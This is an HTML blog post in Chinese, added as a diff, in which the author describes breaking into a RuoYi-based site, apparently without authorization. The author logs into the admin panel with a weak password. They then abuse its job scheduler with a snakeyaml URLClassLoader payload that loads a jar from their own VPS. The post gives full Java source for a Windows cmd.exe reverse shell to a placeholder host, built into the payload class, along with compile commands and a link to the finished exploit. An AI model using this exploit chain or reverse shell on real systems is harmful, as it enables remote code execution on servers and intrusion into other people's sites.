@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="大晚上看了一个站，弱口令进了后台，是若依的二开。网上找了一下官方给的历史漏洞https:&#x2F;&#x2F;doc.ruoyi.vip&#x2F;ruoyi&#x2F;document&#x2F;kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E，很不错全部修了，准备洗洗睡了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次若依cms后台getshell">
+<meta property="og:url" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="书鱼">
+<meta property="og:description" content="大晚上看了一个站，弱口令进了后台，是若依的二开。网上找了一下官方给的历史漏洞https:&#x2F;&#x2F;doc.ruoyi.vip&#x2F;ruoyi&#x2F;document&#x2F;kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E，很不错全部修了，准备洗洗睡了。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/1.png">
+<meta property="og:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/2.png">
+<meta property="og:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/3.png">
+<meta property="og:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/4.png">
+<meta property="og:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/5.png">
+<meta property="og:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/6.png">
+<meta property="og:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/7.png">
+<meta property="article:published_time" content="2021-06-26T15:37:34.000Z">
+<meta property="article:modified_time" content="2023-07-17T02:54:20.798Z">
+<meta property="article:author" content="Bkfish">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>记一次若依cms后台getshell</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/12/21/2021-%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/12/11/JavaScript-Prototype-Pollution-Attack/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&text=记一次若依cms后台getshell"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&is_video=false&description=记一次若依cms后台getshell"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次若依cms后台getshell&body=Check out this article: http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&name=记一次若依cms后台getshell&description=&lt;p&gt;大晚上看了一个站，弱口令进了后台，是若依的二开。网上找了一下官方给的历史漏洞&lt;a href=&#34;https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E&#34;&gt;https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E&lt;/a&gt;，很不错全部修了，准备洗洗睡了。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&t=记一次若依cms后台getshell"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">转机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%80%8E%E4%B9%88%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.</span> <span class="toc-text">windows怎么反弹shell</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        记一次若依cms后台getshell
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Bkfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-06-26T15:37:34.000Z" class="dt-published" itemprop="datePublished">2021-06-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>大晚上看了一个站，弱口令进了后台，是若依的二开。网上找了一下官方给的历史漏洞<a target="_blank" rel="noopener" href="https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E</a>，很不错全部修了，准备洗洗睡了。</p>
+<span id="more"></span>
+
+<h3 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h3><p>系统在后台浏览了一下功能，发现存在一个任务调度的功能<br><img src="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/1.png"><br>看了一下具体规则是可以动态调用任意类任意方法，而且若依里面有snakeyaml<br><img src="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/2.png"></p>
+<p>于是考虑用用artsploit攻击spring-cloud<br><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a><br>改了一下代码<br><img src="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/3.png"><br>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+<p>在vps上起一个http，把生成的yaml-payload.jar丢上面，新增一个定时任务。<br><img src="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/4.png"><br>其中目标字符串改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;vps/yaml-payload.jar&quot;]]]]&#x27;)</span><br></pre></td></tr></table></figure>
+<p>立即执行<br>好家伙<br><img src="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/5.png"></p>
+<h3 id="windows怎么反弹shell"><a href="#windows怎么反弹shell" class="headerlink" title="windows怎么反弹shell"></a>windows怎么反弹shell</h3><p>目标站点是windows的，直接命令执行暴力反弹&#x2F;上cs感觉不优雅，命令执行也没得回显<br>但是既然开始调用jar了，何不直接撸一个原生的shell反弹，类似于之前这篇文章<a target="_blank" rel="noopener" href="https://bkfish.gitee.io/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/">改写ysoserial解决常规shell失效问题</a><br>直接写了一个windows的原生shell</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> java.io.IOException, InterruptedException &#123;</span><br><span class="line">        String host=<span class="string">&quot;ip&quot;</span>;</span><br><span class="line">        <span class="type">int</span> port=port;</span><br><span class="line">        String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">        Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">        java.net.Socket s=<span class="keyword">new</span> <span class="title class_">java</span>.net.Socket(host,port);</span><br><span class="line">        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">            <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pi.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pe.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                po.write(si.read());</span><br><span class="line">            &#125;</span><br><span class="line">            so.flush();</span><br><span class="line">            po.flush();</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                p.exitValue();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p.destroy();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac demo.java</span><br><span class="line">javac</span><br></pre></td></tr></table></figure>
+<p>好家伙，还挺好用<br><img src="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/6.png"><br>然后改写<br>AwesomeScriptEngineFactory</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> <span class="keyword">throws</span> java.io.IOException, InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">        String host=<span class="string">&quot;ip&quot;</span>;</span><br><span class="line">        <span class="type">int</span> port=port;</span><br><span class="line">        String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">        Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">        java.net.Socket s=<span class="keyword">new</span> <span class="title class_">java</span>.net.Socket(host,port);</span><br><span class="line">        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">            <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pi.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pe.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                po.write(si.read());</span><br><span class="line">            &#125;</span><br><span class="line">            so.flush();</span><br><span class="line">            po.flush();</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                p.exitValue();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p.destroy();</span><br><span class="line">        s.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>编译-&gt;丢vps-&gt;新建任务-&gt;反弹getshell<br><img src="/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/7.png"><br>完成exp<a target="_blank" rel="noopener" href="https://github.com/bkfish/yaml-payload-for-Win">https://github.com/bkfish/yaml-payload-for-Win</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">转机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%80%8E%E4%B9%88%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.</span> <span class="toc-text">windows怎么反弹shell</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&text=记一次若依cms后台getshell"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&title=记一次若依cms后台getshell"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/&is_video=false&description=记一次若依cms后台getshell"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次若依cms后台getshell&body=Check out this article: http://example.com/2021/06/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8B%A5%E4%BE%9Dcms%E5%90%8E%E5%8F%B0getshell/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
